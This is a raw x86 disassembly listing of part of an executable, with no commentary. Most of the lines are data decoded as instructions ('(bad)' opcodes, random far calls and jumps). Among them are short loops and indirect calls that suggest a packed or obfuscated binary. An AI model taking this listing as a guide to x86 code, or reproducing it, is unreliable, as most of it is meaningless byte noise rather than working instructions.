  402166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402167:	push   eax
  402168:	(bad)  
  40216a:	enter  0xc65f,0x47
  40216e:	test   al,0xd4
  402170:	aaa    
  402171:	cdq    
  402172:	stc    
  402173:	add    DWORD PTR [edi+0x19ce2766],0x62395c6e
  40217d:	dec    ebp
  40217e:	inc    ecx
  40217f:	and    eax,DWORD PTR [ecx-0x23a9799c]
  402185:	aas    
  402186:	(bad)  
  402187:	rcl    DWORD PTR [esi],cl
  402189:	lods   al,BYTE PTR ds:[esi]
  40218a:	scas   eax,DWORD PTR es:[edi]
  40218b:	pop    eax
  40218c:	push   edi
  40218d:	push   edx
  40218e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40218f:	xor    dh,dl
  402191:	nop
  402192:	jmp    0xbbbca2e2
  402197:	xor    DWORD PTR [ecx+0x7f],esp
  40219a:	ss loope 0x4021e9
  40219d:	adc    BYTE PTR [ecx-0x8],cl
  4021a0:	(bad)  
  4021a1:	sbb    bl,ah
  4021a3:	jmp    0xe73de0fa
  4021a8:	cwde   
  4021a9:	add    BYTE PTR [eax+0x40],0xee
  4021ad:	outs   dx,BYTE PTR ds:[esi]
  4021ae:	les    eax,FWORD PTR [edi+ecx*4-0x2277ca03]
  4021b5:	pushf  
  4021b6:	sbb    esp,esp
  4021b8:	ror    bh,0xb7
  4021bb:	dec    ebx
  4021bc:	out    dx,eax
  4021bd:	xchg   edi,eax
  4021be:	lods   al,BYTE PTR ds:[esi]
  4021bf:	sar    bl,0xf6
  4021c2:	call   0xf47ce2e9
  4021c7:	jmp    0xce1bc097
  4021cc:	mov    ah,0x61
  4021ce:	iret   
  4021cf:	shl    esi,cl
  4021d1:	sbb    eax,0x3a74f9e2
  4021d6:	jecxz  0x40224c
  4021d8:	dec    edi
  4021d9:	clc    
  4021da:	cmp    eax,0x79c2abca
  4021df:	pop    ss
  4021e0:	or     ecx,DWORD PTR [edx+0x2a]
  4021e3:	std    
  4021e4:	jb     0x4021ca
  4021e6:	fyl2x  
  4021e8:	call   0x242a:0xcbf9caaf
  4021ef:	int3   
  4021f0:	fidivr WORD PTR [edx+ecx*2+0x5732c8e9]
  4021f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021f8:	cmp    BYTE PTR [eax],dl
  4021fa:	xor    ebp,esp
  4021fc:	mov    edx,0xc4503e68
  402201:	cmp    al,0x2e
  402203:	sub    esi,edx
  402205:	je     0x40222e
  402207:	sub    eax,0x7513a324
  40220c:	pop    ecx
  40220e:	and    BYTE PTR [esp+esi*2],ch
  402211:	pop    esi
  402212:	mov    BYTE PTR [eax],al
  402214:	xchg   edi,eax
  402215:	pushf  
  402216:	inc    esp
  402217:	leave  
  402218:	aaa    
  402219:	dec    eax
  40221a:	adc    eax,0x12ef7d87
  40221f:	or     dl,dh
  402221:	or     BYTE PTR [ecx+esi*2-0x56feb355],al
  402228:	pop    edi
  402229:	push   ss
  40222a:	jecxz  0x40223c
  40222c:	add    DWORD PTR [esi-0x5e2e67df],0xfffffff3
  402233:	fsubp  st(3),st
  402235:	int3   
  402236:	push   ecx
  402237:	and    edx,DWORD PTR [ebp-0x1b08995f]
  40223d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40223e:	and    ecx,DWORD PTR [ebx-0x75]
  402241:	dec    ebx
  402242:	cdq    
  402243:	sbb    ebp,esi
  402245:	clc    
  402246:	ror    DWORD PTR [edx+0x435f5971],0x7f
  40224d:	cmp    BYTE PTR [eax],al
  40224f:	or     ecx,DWORD PTR [edi+0x4e]
  402252:	or     bh,BYTE PTR ds:0xb28c0d63
  402258:	pop    ebx
  402259:	mul    al
  40225b:	mov    edi,DWORD PTR [ebx+esi*1-0x7b]
  40225f:	dec    edi
  402260:	mov    ss,edx
  402262:	icebp  
  402263:	inc    edi
  402264:	outs   dx,BYTE PTR ds:[esi]
  402265:	mov    bl,0xc0
  402267:	mov    ds:0xfbbcf222,al
  40226c:	sbb    DWORD PTR [edi],edi
  40226e:	aad    0x94
  402270:	setp   BYTE PTR [edi-0x2c951a88]
  402277:	sub    ebx,0xffffffb3
  40227a:	arpl   WORD PTR [edx+0x2d82c447],dx
  402280:	sub    ebx,DWORD PTR [edi+0x56206efa]
  402286:	mov    ebp,0x6519ccf1
  40228b:	sub    dl,BYTE PTR fs:[edx-0x22]
  40228f:	sahf   
  402290:	sbb    BYTE PTR [ebx+esi*8-0x5f808653],ch
  402297:	nop
  402298:	fdiv   DWORD PTR [esi-0x7189d82b]
  40229e:	add    DWORD PTR [edx-0x26492b71],ebx
  4022a4:	mov    esi,0x308bb664
  4022a9:	shr    BYTE PTR [edi-0x29],1
  4022ac:	(bad)  
  4022ad:	jmp    0x4022ac
  4022af:	not    BYTE PTR ds:0x6d723f89
  4022b5:	jge    0x40227f
  4022b7:	sbb    eax,0xa44e2fe9
  4022bc:	adc    eax,0x41202001
  4022c1:	jb     0x402252
  4022c3:	cmp    BYTE PTR [ebp-0x66ecf341],0x99
  4022ca:	pop    esp
  4022cb:	push   ecx
  4022cc:	and    DWORD PTR ds:0x42ec6f,0x0
  4022d6:	mov    edx,DWORD PTR ds:0x42ec6f
  4022dc:	inc    edx
  4022dd:	mov    DWORD PTR ds:0x42ec6f,edx
  4022e3:	cmp    DWORD PTR ds:0x42ec6f,0x28
  4022ea:	jne    0x4022fe
  4022f0:	push   DWORD PTR [ebp-0x18]
  4022f3:	push   0x56d1
  4022f8:	call   DWORD PTR ds:0x42e83f
  4022fe:	cmp    DWORD PTR ds:0x42ec6f,0x19
  402305:	jb     0x4022d6
  40230b:	mov    DWORD PTR ds:0x4302c1,0x1f
  402315:	cmp    DWORD PTR ds:0x4302c1,0x0
  40231c:	je     0x402548
  402322:	cmp    DWORD PTR ds:0x4302c1,0x2c
  402329:	jne    0x40233a
  40232f:	push   0x7b19
  402334:	call   DWORD PTR ds:0x42e82f
  40233a:	xor    edx,edx
  40233c:	xor    edx,DWORD PTR ds:0x4302c1
  402342:	dec    edx
  402343:	mov    DWORD PTR ds:0x4302c1,edx
  402349:	jmp    0x402315
  40234e:	adc    eax,edx
  402350:	jmp    0x402548
  402355:	ds je  0x4022d9
  402358:	cdq    
  402359:	mov    cl,0x69
  40235b:	out    0x71,al
  40235d:	sub    al,0x9b
  40235f:	mov    cl,0x3a
  402361:	(bad)  
  402362:	daa    
  402363:	mov    ecx,0x7e03db1a
  402368:	jle    0x4023bf
  40236a:	jg     0x4023ea
  40236c:	jle    0x4023b7
  40236e:	jmp    0x6684:0x1e354408
  402375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402376:	(bad)  
  402377:	push   0xffffffff
  402379:	xchg   DWORD PTR [ebx+eax*8-0x50bb1e23],esp
  402380:	in     eax,0xcd
  402382:	mov    WORD PTR [ebx-0x3840d474],es
  402388:	inc    ecx
  402389:	pop    edx
  40238a:	push   esi
  40238b:	jg     0x4023be
  40238d:	daa    
  40238e:	jbe    0x402404
  402390:	les    eax,FWORD PTR [eax-0x47]
  402393:	imul   edx,DWORD PTR [eax-0x774c207c],0x50
  40239a:	mov    ebp,0xfe043808
  40239f:	xchg   ebp,eax
  4023a0:	aas    
  4023a1:	pop    eax
  4023a2:	out    0x38,eax
  4023a4:	sub    eax,0x7e6f7891
  4023a9:	icebp  
  4023aa:	push   eax
  4023ab:	mov    ds:0xd2745bdf,al
  4023b0:	push   ss
  4023b1:	mov    eax,edx
  4023b3:	mov    BYTE PTR [ecx+esi*2-0x6748184d],cl
  4023ba:	mov    BYTE PTR [edi+ebx*2-0x6abdc467],0x5c
  4023c2:	pop    ds
  4023c3:	jo     0x402357
  4023c5:	hlt    
  4023c6:	jae    0x402417
  4023c8:	inc    esi
  4023c9:	fwait
  4023ca:	add    BYTE PTR [esi],0x6e
  4023cd:	sub    DWORD PTR [edx],esi
  4023cf:	ds ret 0xfac4
  4023d3:	(bad)  
  4023d4:	(bad)  
  4023d5:	jno    0x4023b5
  4023d7:	enter  0x2717,0xa3
  4023db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023dc:	stc    
  4023dd:	inc    edx
  4023de:	rcl    DWORD PTR [edx+0x73],cl
  4023e1:	sbb    cl,bl
  4023e3:	sbb    al,0x13
  4023e5:	sbb    eax,0xb371e323
  4023ea:	jmp    0x402452
  4023ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023ed:	dec    edi
  4023ee:	mov    ebp,0x477e2d95
  4023f3:	femms  
  4023f5:	sub    DWORD PTR [esi+0x65],edx
  4023f8:	sbb    BYTE PTR [edx+0x54],bl
  4023fb:	stos   BYTE PTR es:[edi],al
  4023fc:	push   ecx
  4023fd:	pop    ebp
  4023fe:	std    
  4023ff:	lahf   
  402400:	add    bl,BYTE PTR [edx]
  402402:	gs pop ecx
  402404:	sbb    al,0xb7
  402406:	mov    eax,0xa7d0a951
  40240b:	aam    0xf4
  40240d:	popf   
  40240e:	sub    dl,BYTE PTR [ebx-0xcf209a0]
  402414:	das    
  402415:	adc    BYTE PTR [ebp+edx*2-0x11],bh
  402419:	das    
  40241a:	cmp    BYTE PTR [eax+0x6a356002],bl
  402420:	push   ecx
  402421:	sub    eax,0xbb5e41ef
  402426:	test   dl,al
  402428:	adc    DWORD PTR [ecx+eiz*4-0x1279c1d8],esi
  40242f:	xchg   ebp,eax
  402430:	int    0x2a
  402432:	loopne 0x4023db
  402434:	stc    
  402435:	pop    ebp
  402436:	and    ch,BYTE PTR [edx-0x71f3b373]
  40243c:	push   ebx
  40243d:	sub    eax,0x69b337c3
  402442:	adc    BYTE PTR [ebp-0x4b],0x6a
  402446:	in     eax,0x9d
  402448:	test   edi,0xcc5ef37b
  40244e:	cmc    
  40244f:	adc    DWORD PTR ds:0xc5b81e24,eax
  402455:	retf   
  402456:	fadd   DWORD PTR [esi-0x7430025a]
  40245c:	in     al,dx
  40245d:	and    eax,0x9d5fef37
  402462:	leave  
  402463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402464:	retf   
  402465:	(bad)  
  402466:	sbb    WORD PTR [ecx],0xffb3
  40246a:	aam    0x6a
  40246c:	mov    edx,0x3dd95b18
  402471:	fdivr  QWORD PTR [ebp+0x11d7bfb9]
  402477:	cmp    eax,0xd405e8a7
  40247c:	mov    ds:0xa9298ceb,al
  402481:	test   eax,0x9a7be688
  402486:	xchg   esp,eax
  402487:	int    0x35
  402489:	retf   0x6e89
  40248c:	inc    edi
  40248d:	mov    al,0x7f
  40248f:	jge    0x4024c3
  402491:	(bad)  
  402492:	stos   DWORD PTR es:[edi],eax
  402493:	ror    ah,cl
  402495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402496:	jp     0x402419
  402498:	shr    DWORD PTR [ebx+0x6d003e90],0xd3
  40249f:	popf   
  4024a0:	jnp    0x402442
  4024a2:	test   al,0xb6
  4024a4:	and    BYTE PTR [edx+0x48],ch
  4024a7:	fld    QWORD PTR [edi-0x7b]
  4024aa:	sbb    al,0x41
  4024ac:	jp     0x40244a
  4024ae:	ja     0x402456
  4024b0:	fs test al,0xd8
  4024b3:	sahf   
  4024b4:	xchg   esi,eax
  4024b5:	dec    ebx
  4024b6:	and    ebp,DWORD PTR [edi]
  4024b8:	inc    esi
  4024b9:	aas    
  4024ba:	test   al,0xa
  4024bc:	add    DWORD PTR [eax+edx*8-0x1b19ea9],ebp
  4024c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024c4:	int    0xc
  4024c6:	rol    BYTE PTR [ecx-0x6737e936],0x7f
  4024cd:	push   eax
  4024ce:	sub    ch,al
  4024d0:	add    DWORD PTR [ebx+0x1a],ebp
  4024d3:	in     eax,0xd3
  4024d5:	add    eax,0x5f988e80
  4024da:	cmp    ebp,edx
  4024dc:	adc    BYTE PTR [edx],cl
  4024de:	(bad)  
  4024df:	loopne 0x40253e
  4024e1:	repnz adc ecx,DWORD PTR [esi]
  4024e4:	dec    edi
  4024e5:	popf   
  4024e6:	pop    es
  4024e7:	or     BYTE PTR [edi+0x5e82542a],ah
  4024ed:	sbb    eax,0xca9e6ead
  4024f2:	or     BYTE PTR [ebp-0x28],dl
  4024f5:	jecxz  0x40248c
  4024f7:	inc    esi
  4024f8:	in     eax,0x2d
  4024fa:	out    dx,al
  4024fb:	push   esi
  4024fc:	int    0x6e
  4024fe:	shr    BYTE PTR [eax],cl
  402500:	and    ebx,DWORD PTR [edi]
  402502:	pop    es
  402503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402504:	dec    ebx
  402505:	xlat   BYTE PTR ds:[ebx]
  402506:	push   ebp
  402507:	inc    edi
  402508:	dec    eax
  402509:	sbb    eax,0xae5e5baa
  40250e:	stos   DWORD PTR es:[edi],eax
  40250f:	call   0x729f:0x1174b258
  402516:	shl    BYTE PTR [eax+0x43],0xae
  40251a:	push   cs
  40251b:	test   eax,0xdddea178
  402520:	imul   esp,DWORD PTR [ebp-0x72b390d3],0x2807645f
  40252a:	outs   dx,DWORD PTR ds:[esi]
  40252b:	fmul   QWORD PTR [eax+0x7b47fcc2]
  402531:	jnp    0x4024f6
  402533:	in     eax,dx
  402534:	and    DWORD PTR [eax],ebx
  402536:	fiadd  WORD PTR [ecx+0x4a]
  402539:	imul   eax,edx,0xae283e3f
  40253f:	in     al,dx
  402540:	test   DWORD PTR [edx+0x67cc3b47],ebx
  402546:	out    0xa1,al
  402548:	push   ecx
  402549:	and    DWORD PTR ds:0x42ec4b,0x3339
  402553:	mov    eax,0xf89c8531
  402558:	movzx  edx,WORD PTR ds:0x42ec73
  40255f:	xor    edx,DWORD PTR ds:0x42ec4f
  402565:	mov    DWORD PTR ds:0x42ec73,edx
  40256b:	mov    DWORD PTR [ebp-0x8],eax
  40256e:	xor    ecx,ecx
  402570:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  402577:	mov    edx,DWORD PTR [ebp-0x8]
  40257a:	add    DWORD PTR ds:0x4302e5,0x1aee
  402584:	push   esi
  402585:	mov    ecx,0x7510854
  40258a:	xor    esi,esi
  40258c:	or     esi,DWORD PTR ds:0x4302c5
  402592:	and    DWORD PTR ds:0x42ec57,esi
  402598:	xor    edx,ecx
  40259a:	and    DWORD PTR ds:0x43034f,0x0
  4025a4:	jmp    0x4025b8
  4025a9:	xor    esi,esi
  4025ab:	xor    esi,DWORD PTR ds:0x43034f
  4025b1:	inc    esi
  4025b2:	mov    DWORD PTR ds:0x43034f,esi
  4025b8:	cmp    DWORD PTR ds:0x43034f,0x10
  4025bf:	jae    0x4025fc
  4025c5:	cmp    DWORD PTR ds:0x43034f,0x9
  4025cc:	jne    0x4025dd
  4025d2:	push   0x42e6c6
  4025d7:	call   DWORD PTR ds:0x42e843
  4025dd:	cmp    DWORD PTR ds:0x43034f,0x8
  4025e4:	jne    0x4025f7
  4025ea:	mov    esi,DWORD PTR ds:0x43034f
  4025f0:	inc    esi
  4025f1:	mov    DWORD PTR ds:0x43034f,esi
  4025f7:	jmp    0x4025a9
  4025fc:	mov    esi,0x32729b
  402601:	jmp    0x4027f9
  402606:	lock and ch,BYTE PTR [esi+eax*1-0xf8f6f94]
  40260e:	xchg   edi,eax
  40260f:	aaa    
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	fs mov bl,0xc8
  402614:	stc    
  402615:	inc    ebx
  402616:	add    DWORD PTR ds:[esi+0x7e],edi
  40261a:	push   ebp
  40261b:	jg     0x40269b
  40261d:	jle    0x40267d
  40261f:	scas   al,BYTE PTR es:[edi]
  402620:	imul   esp,esp,0x33
  402623:	mov    edx,0x35d3bf4d
  402628:	lods   al,BYTE PTR ds:[esi]
  402629:	pop    esi
  40262a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40262b:	sub    ebp,DWORD PTR [ebp+esi*4-0x6a]
  40262f:	lods   eax,DWORD PTR ds:[esi]
  402630:	pop    ebp
  402631:	sub    al,0xd2
  402633:	call   DWORD PTR [ebp-0x361d44b2]
  402639:	jmp    0xd62cd5fc
  40263e:	(bad)  
  40263f:	mov    esi,0x89eed38
  402644:	push   esi
  402645:	or     ah,cl
  402647:	icebp  
  402648:	or     BYTE PTR [ebx+0x12edd5d6],dh
  40264e:	sub    ebx,0x5aac8c50
  402654:	sbb    DWORD PTR [edx],edi
  402656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402657:	pop    es
  402658:	aaa    
  402659:	cmp    BYTE PTR [ebp-0x75],0x96
  40265d:	push   0xd7d8248
  402662:	xor    BYTE PTR [edi+0x35],0xed
  402666:	mov    ch,0x78
  402668:	sub    bl,ch
  40266a:	jb     0x4026a7
  40266c:	sub    dl,0x8c
  40266f:	outs   dx,BYTE PTR ds:[esi]
  402670:	ficom  WORD PTR [esi-0xe2b34bd]
  402676:	je     0x4026a6
  402678:	add    DWORD PTR [ebx+eiz*1+0x52],ebp
  40267c:	stos   BYTE PTR es:[edi],al
  40267d:	rcl    bl,1
  40267f:	shl    DWORD PTR [ecx],cl
  402681:	imul   ebx,edi,0x13
  402684:	in     al,dx
  402685:	test   al,0xa0
  402687:	pop    edx
  402688:	rcr    BYTE PTR [eax+edi*8-0x15],1
  40268c:	ficomp WORD PTR [ebx]
  40268e:	mov    edi,0x45a3cfa
  402693:	adc    DWORD PTR ds:[ebx-0x64],0xffffffde
  402698:	clc    
  402699:	adc    esi,DWORD PTR [ecx-0x64b82f13]
  40269f:	enter  0x2db9,0x73
  4026a3:	jb     0x40268d
  4026a5:	js     0x4026ab
  4026a7:	enter  0x92e8,0x8
  4026ab:	gs aad 0x2d
  4026ae:	mov    al,ds:0x9073cdd2
  4026b3:	cld    
  4026b4:	rol    DWORD PTR [esi-0x47],0x6c
  4026b8:	pop    esp
  4026b9:	jp     0x402704
  4026bb:	aaa    
  4026bc:	std    
  4026bd:	push   0xfffffffb
  4026bf:	and    al,dh
  4026c1:	jecxz  0x40270d
  4026c3:	xchg   bh,ch
  4026c5:	pushf  
  4026c6:	push   es
  4026c7:	mov    bl,dh
  4026c9:	pusha  
  4026ca:	outs   dx,BYTE PTR ds:[esi]
  4026cb:	cmp    DWORD PTR [ebx],ebx
  4026cd:	adc    ecx,eax
  4026cf:	adc    BYTE PTR [edx-0x21ddb6dc],ah
  4026d5:	adc    cl,BYTE PTR [esi-0x16]
  4026d8:	jecxz  0x402745
  4026da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026db:	out    dx,eax
  4026dc:	mov    dl,0xb7
  4026de:	pop    ebp
  4026df:	call   0x5515:0xb7fd1f65
  4026e6:	ret    
  4026e7:	mov    edi,DWORD PTR [eax+ebp*1+0x6f3d9f86]
  4026ee:	or     DWORD PTR [edi+0x67c766ad],edx
  4026f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026f5:	and    esp,edi
  4026f7:	out    dx,eax
  4026f8:	(bad)  
  4026f9:	cmp    al,0x3f
  4026fb:	xor    ecx,eax
  4026fd:	mov    edx,0x307f28ad
  402702:	dec    ebx
  402703:	mov    edi,0x2c6e6837
  402708:	je     0x4026b3
  40270a:	add    dl,0x6b
  40270d:	stos   BYTE PTR es:[edi],al
  40270e:	adc    eax,0xec5ecbf5
  402713:	cs and edx,edx
  402716:	(bad)  
  402717:	xor    al,0xaa
  402719:	push   0xffffff85
  40271b:	cld    
  40271c:	nop
  40271d:	ror    BYTE PTR [ebx],1
  40271f:	ins    BYTE PTR es:[edi],dx
  402720:	pusha  
  402721:	sbb    BYTE PTR [ecx+0x5a730990],dh
  402727:	pusha  
  402728:	mov    al,ds:0x571a0dd6
  40272d:	add    BYTE PTR [esi-0x21],al
  402730:	popf   
  402731:	call   0x645b:0xd1c31273
  402738:	xchg   DWORD PTR [esi+0x64],ecx
  40273b:	mov    WORD PTR [esi+esi*4],ss
  40273e:	pop    ds
  40273f:	xchg   ebp,eax
  402740:	popf   
  402741:	test   DWORD PTR [edi+0x2f],ebx
  402744:	sbb    eax,0xf695a3ac
  402749:	outs   dx,BYTE PTR ds:[esi]
  40274a:	xor    eax,0x624cfa25
  40274f:	jl     0x40277d
  402751:	out    dx,eax
  402752:	lods   eax,DWORD PTR ds:[esi]
  402753:	rol    DWORD PTR [ebx+0x2d],cl
  402756:	xchg   DWORD PTR [ebx+edi*2],ebx
  402759:	call   0x31bb97ab
  40275e:	stos   DWORD PTR es:[edi],eax
  40275f:	scas   eax,DWORD PTR es:[edi]
  402760:	ficomp DWORD PTR [edx-0x64]
  402763:	out    0xaf,al
  402765:	sbb    DWORD PTR [edx-0x6a],0xffffff89
  402769:	in     eax,0x15
  40276b:	in     eax,dx
  40276c:	pop    esp
  40276d:	mov    ecx,0x261c72c0
  402772:	fisubr WORD PTR [eax+0x10212ecc]
  402778:	sub    eax,0x659bec4b
  40277d:	jge    0x4027c1
  40277f:	js     0x402796
  402781:	xchg   edx,eax
  402782:	das    
  402783:	dec    ecx
  402784:	pop    ss
  402785:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402786:	mov    esp,0x637040eb
  40278b:	imul   edx,DWORD PTR [esi-0x69],0x320b6036
  402792:	ret    
  402793:	addr16 push edx
  402795:	arpl   WORD PTR [edi+0x7c],bp
  402798:	imul   ecx,DWORD PTR [ebx-0x426b7fdd],0x86342c51
  4027a2:	inc    ecx
  4027a3:	dec    eax
  4027a4:	mov    ch,BYTE PTR [esi-0x46]
  4027a7:	jnp    0x402754
  4027a9:	mov    al,ds:0xd8630303
  4027ae:	iret   
  4027af:	in     eax,0xe0
  4027b1:	adc    BYTE PTR [ecx],al
  4027b3:	mov    bh,0xd3
  4027b5:	data16 sub al,0xed
  4027b8:	mov    ebp,0x1b31a749
  4027bd:	pop    edx
  4027be:	xor    al,0x70
  4027c0:	cmp    edx,eax
  4027c2:	sub    eax,0x833f768c
  4027c7:	in     eax,dx
  4027c8:	mov    eax,0xf2491251
  4027cd:	jle    0x402795
  4027cf:	std    
  4027d0:	popa   
  4027d1:	sbb    cl,BYTE PTR [edi+eiz*1]
  4027d4:	adc    DWORD PTR [bp-0x4c],esp
  4027d8:	and    BYTE PTR [edi+ebx*1],0x53
  4027dc:	ret    0xc50a
  4027df:	cmc    
  4027e0:	cli    
  4027e1:	or     esi,DWORD PTR [edx+0x55e8c9c1]
  4027e7:	call   0xb638ab2d
  4027ec:	jnp    0x402818
  4027ee:	adc    ebx,esp
  4027f0:	fcmovnbe st,st(4)
  4027f2:	add    bh,BYTE PTR [edx]
  4027f4:	mov    ds,WORD PTR [esi+0x57bd54df]
  4027fa:	mov    edi,DWORD PTR [ebp+0x10]
  4027fd:	add    edx,esi
  4027ff:	cmp    edi,edx
  402801:	je     0x402e62
  402807:	mov    edx,DWORD PTR [ebp-0x8]
  40280a:	mov    eax,DWORD PTR [ebp-0x4]
  40280d:	xor    eax,ecx
  40280f:	mov    edi,0xffcd8d65
  402814:	sub    edi,eax
  402816:	jmp    0x402a0e
  40281b:	ins    BYTE PTR es:[edi],dx
  40281c:	cmp    al,0x55
  40281e:	arpl   WORD PTR [ebp+0x73],si
  402821:	push   0x2ad4f5d1
  402826:	xor    eax,eax
  402828:	sub    eax,0xf15592d
  40282d:	jle    0x4028ad
  40282f:	push   ebp
  402830:	jg     0x4028b0
  402832:	jle    0x4027d0
  402834:	sbb    BYTE PTR [ebx+0x7e],dl
  402837:	xor    BYTE PTR [esi],dl
  402839:	ja     0x402813
  40283b:	fild   DWORD PTR [edi-0x1b322f3f]
  402841:	add    cl,BYTE PTR [eax-0x3e6fde51]
  402847:	jo     0x402832
  402849:	loopne 0x402819
  40284b:	or     al,0x67
  40284d:	ret    0x7278
  402850:	sbb    DWORD PTR [ebx+0x2c],esi
  402853:	dec    esi
  402854:	mov    eax,0x2fc2ea31
  402859:	test   al,0x18
  40285b:	das    
  40285c:	jle    0x402864
  40285e:	fadd   DWORD PTR [esi-0x80]
  402861:	pushf  
  402862:	fs (bad) 
  402865:	addr16 pop ds
  402867:	pop    ecx
  402868:	adc    eax,0xaf0cb2c
  40286d:	test   BYTE PTR [esi],ch
  40286f:	jecxz  0x40280f
  402871:	sub    al,BYTE PTR [ecx+eiz*4-0x5c1dab9d]
  402878:	mov    ebp,0xc7aa57a8
  40287d:	push   esp
  40287e:	fidivr WORD PTR [edi-0x73]
  402881:	lods   eax,DWORD PTR ds:[esi]
  402882:	add    BYTE PTR [ebp-0x69],ch
  402885:	int3   
  402886:	or     DWORD PTR [ecx],ebp
  402888:	mov    bh,0xb3
  40288a:	sub    edx,esi
  40288c:	sub    dl,BYTE PTR [eax]
  40288e:	repz and eax,0xe7bb53b
  402894:	cmp    DWORD PTR [esi+0x4989a1ed],eax
  40289a:	push   ebx
  40289b:	rol    DWORD PTR [eax-0x6dafd562],0x48
  4028a2:	adc    al,0xab
  4028a4:	stos   DWORD PTR es:[edi],eax
  4028a5:	mov    bh,0x17
  4028a7:	add    DWORD PTR [ebp-0x41],edx
  4028aa:	xor    edx,esp
  4028ac:	jnp    0x4028c0
  4028ae:	test   eax,0xd384905
  4028b3:	loope  0x4028ec
  4028b5:	add    al,0x8d
  4028b7:	out    dx,eax
  4028b8:	push   edx
  4028b9:	xchg   ecx,eax
  4028ba:	or     al,0xdc
  4028bc:	push   ss
  4028bd:	and    ch,al
  4028bf:	push   ebx
  4028c0:	mov    ebx,0xba3b5a5a
  4028c5:	push   esi
  4028c6:	jae    0x402919
  4028c8:	ins    DWORD PTR es:[edi],dx
  4028c9:	pop    ss
  4028ca:	pop    ss
  4028cb:	jmp    FWORD PTR [ecx+edi*1]
  4028ce:	pop    ss
  4028cf:	inc    ecx
  4028d0:	push   0x73
  4028d2:	fisttp DWORD PTR [eax-0x1e7d31eb]
  4028d8:	pop    edi
  4028d9:	test   BYTE PTR [esi-0x1390e105],bh
  4028df:	dec    ecx
  4028e0:	mov    dh,0xa4
  4028e2:	popf   
  4028e3:	bnd gs jns 0x402932
  4028e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028e8:	sbb    DWORD PTR [ecx+0x29],eax
  4028eb:	sti    
  4028ec:	and    ecx,DWORD PTR [esi-0x53]
  4028ef:	add    al,BYTE PTR [ebx]
  4028f1:	stos   BYTE PTR es:[edi],al
  4028f2:	(bad)  
  4028f3:	mov    bh,BYTE PTR [eax]
  4028f5:	cmp    DWORD PTR [edi],eax
  4028f7:	outs   dx,DWORD PTR ds:[esi]
  4028f8:	div    BYTE PTR [edi+esi*1]
  4028fb:	outs   dx,DWORD PTR fs:[esi]
  4028fd:	ja     0x40296a
  4028ff:	xor    eax,0xe4441ba9
  402904:	popf   
  402905:	sbb    DWORD PTR [edx],0xe34b876b
  40290b:	push   eax
  40290c:	add    BYTE PTR [ecx+0x1aa97f38],dl
  402912:	jg     0x402926
  402914:	jb     0x402908
  402916:	dec    edx
  402917:	fnstenv [ebp+eax*8-0x2fcf5ef5]
  40291e:	push   edx
  40291f:	pcmpgtd mm7,QWORD PTR [ecx]
  402922:	pop    ss
  402923:	inc    edi
  402924:	mov    edx,0x6f26fafb
  402929:	jmp    0x4028b5
  40292b:	fstp   TBYTE PTR [ecx-0x5b]
  40292e:	js     0x402937
  402930:	inc    edx
  402931:	push   ss
  402932:	in     al,dx
  402933:	push   ss
  402934:	mov    ds:0xb617b910,al
  402939:	push   0xffffffb6
  40293b:	sub    BYTE PTR [eax-0x32],dh
  40293e:	xlat   BYTE PTR ds:[ebx]
  40293f:	or     ebp,ebp
  402941:	dec    edx
  402942:	push   edi
  402943:	rcr    BYTE PTR [esi+0x33],1
  402946:	test   BYTE PTR [esi-0x18],dh
  402949:	sti    
  40294a:	lock xchg bl,cl
  40294d:	gs adc ecx,ecx
  402950:	je     0x40291f
  402952:	scas   al,BYTE PTR es:[edi]
  402953:	fwait
  402954:	popf   
  402955:	inc    ebx
  402956:	retf   0xf925
  402959:	in     al,0xbb
  40295b:	aaa    
  40295c:	sbb    edx,ecx
  40295e:	push   esp
  40295f:	std    
  402960:	outs   dx,BYTE PTR ds:[esi]
  402961:	pop    eax
  402962:	push   eax
  402963:	call   0x54b4:0x336c66f
  40296a:	dec    ebx
  40296b:	sbb    bl,bh
  40296d:	inc    eax
  40296e:	cmp    al,0xfe
  402970:	cmp    al,0x3e
  402972:	xchg   ebp,eax
  402973:	scas   eax,DWORD PTR es:[edi]
  402974:	lods   al,BYTE PTR ds:[esi]
  402975:	(bad)  
  402976:	fld    TBYTE PTR [ecx+0x38758b74]
  40297c:	dec    ecx
  40297d:	ret    0x20c8
  402980:	arpl   cx,dx
  402982:	je     0x4029e3
  402984:	push   edi
  402985:	jbe    0x4029d7
  402987:	xor    cl,ch
  402989:	xchg   esi,eax
  40298a:	cmp    DWORD PTR ds:[eax+0x615399e6],edi
  402991:	or     cl,BYTE PTR ds:0xa9865c25
  402997:	cmp    eax,0x90743258
  40299c:	inc    ebp
  40299d:	push   ebp
  40299e:	mov    BYTE PTR [ebp-0x56],dh
  4029a1:	pop    eax
  4029a2:	addr16 jne 0x40295e
  4029a5:	jmp    DWORD PTR [edi]
  4029a7:	adc    edi,DWORD PTR [eax]
  4029a9:	out    dx,eax
  4029aa:	(bad)  
  4029ab:	shl    DWORD PTR [edi+0x45],1
  4029ae:	add    BYTE PTR [edx],dl
  4029b0:	or     ch,BYTE PTR [esi]
  4029b2:	jmp    0x4029f3
  4029b4:	mov    edx,ebx
  4029b6:	jecxz  0x402987
  4029b8:	jmp    0x402a23
  4029ba:	sbb    BYTE PTR [eax-0x36],dh
  4029bd:	xchg   DWORD PTR [ebx],esi
  4029bf:	out    0xb,al
  4029c1:	ret    0x2a88
  4029c4:	sti    
  4029c5:	jle    0x4029f3
  4029c7:	popf   
